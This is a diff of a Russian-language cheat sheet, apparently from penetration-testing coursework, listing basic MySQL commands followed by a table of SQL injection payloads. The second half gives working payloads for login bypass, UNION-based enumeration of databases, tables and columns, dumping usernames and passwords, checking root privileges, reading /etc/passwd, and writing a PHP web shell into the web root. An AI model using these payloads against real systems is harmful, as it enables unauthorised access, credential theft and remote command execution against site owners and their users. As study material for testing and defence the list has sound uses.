@@ -1,13 +1,17 @@
 SHOW DATABASES 	Список доступных баз данных
 USE users 	Переключиться на базу данных
+
 Таблицы 	
+
 CREATE TABLE logins (id INT, ...) 	Добавить новую таблицу
 SHOW TABLES 	Список доступных таблиц в текущей базе данных
 DESCRIBE logins 	Показать свойства и столбцы таблицы
 INSERT INTO table_name VALUES (value_1,..) 	Добавить значения в таблицу
 INSERT INTO table_name(column2, ...) VALUES (column2_value, ..) 	Добавление значений в определенные столбцы таблицы
 UPDATE table_name SET column1=newvalue1, ... WHERE <condition> 	Обновить значения таблицы
+
 Столбцы 	
+
 SELECT * FROM table_name 	Показать все столбцы в таблице
 SELECT column1, column2 FROM table_name 	Показать определенные столбцы в таблице
 DROP TABLE logins 	Удалить таблицу
@@ -15,7 +19,9 @@ ALTER TABLE logins ADD newColumn INT 	Добавить новый столбец
 ALTER TABLE logins RENAME COLUMN newColumn TO oldColumn 	Переименовать столбец
 ALTER TABLE logins MODIFY oldColumn DATE 	Изменить тип данных столбца
 ALTER TABLE logins DROP oldColumn 	Удалить столбец
+
 Выход 	
+
 SELECT * FROM logins ORDER BY column_1 	Сортировать по столбцу
 SELECT * FROM logins ORDER BY column_1 DESC 	Сортировать по столбцу в порядке убывания
 SELECT * FROM logins ORDER BY column_1 DESC, id ASC 	Сортировать по двум столбцам
@@ -23,6 +29,8 @@ SELECT * FROM logins LIMIT 2 	Показать только первые два 
 SELECT * FROM logins LIMIT 1, 2 	Показывать только первые два результата, начиная с индекса 2
 SELECT * FROM table_name WHERE <condition> 	Получение списка результатов, соответствующих условию
 SELECT * FROM logins WHERE username LIKE 'admin%' 	Получение списка результатов, имя которых похоже на заданную строку
+
+
 Приоритет операторов MySQL
 
     Разделение ( /), Умножение ( *) и модуль ( %)
@@ -33,17 +41,23 @@ SELECT * FROM logins WHERE username LIKE 'admin%' 	Получение списк
     ИЛИ ( ||)
 
 SQL-инъекция
+
 Полезная нагрузка 	Описание
+
 Обход аутентификации 	
 admin' or '1'='1 	Базовый обход аутентификации
 admin')-- - 	Базовый обход аутентификации С комментариями
 Полезные данные обхода аутентификации 	
-Союзная инъекция 	
+
+Союзная инъекция
+ 	
 ' order by 1-- - 	Определите количество столбцов, используя order by
 cn' UNION select 1,2,3-- - 	Определить количество столбцов с помощью инъекции Union
 cn' UNION select 1,@@version,3,4-- - 	Базовая инъекция Union
 UNION select username, 2, 3, 4 from passwords-- - 	Инъекция соединения на 4 колонки
-Перечисление БД 	
+
+Перечисление БД
+ 	
 SELECT @@version 	Отпечаток пальца MySQL с выводом запроса
 SELECT SLEEP(5) 	Отпечаток пальца MySQL без вывода
 cn' UNION select 1,database(),2,3-- - 	Текущее имя базы данных
@@ -51,12 +65,16 @@ cn' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- - 	Спи�
 cn' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- - 	Перечислить все таблицы в определенной базе данных
 cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- - 	Перечислить все столбцы в определенной таблице
 cn' UNION select 1, username, password, 4 from dev.credentials-- - 	Дамп данных из таблицы в другой базе данных
+
 Привилегии 	
+
 cn' UNION SELECT 1, user(), 3, 4-- - 	Найти текущего пользователя
 cn' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- - 	Узнайте, имеет ли пользователь права администратора
 cn' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges WHERE grantee="'root'@'localhost'"-- - 	Найти, все ли права пользователя
 cn' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- - 	Найдите, к каким каталогам можно получить доступ через MySQL
-Внедрение файлов 	
+
+Внедрение файлов 
+	
 cn' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- - 	Чтение локального файла
 select 'file written successfully!' into outfile '/var/www/html/proof.txt' 	Записать строку в локальный файл
 cn' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- - 	Запишите веб-оболочку в базовый веб-каталог. 
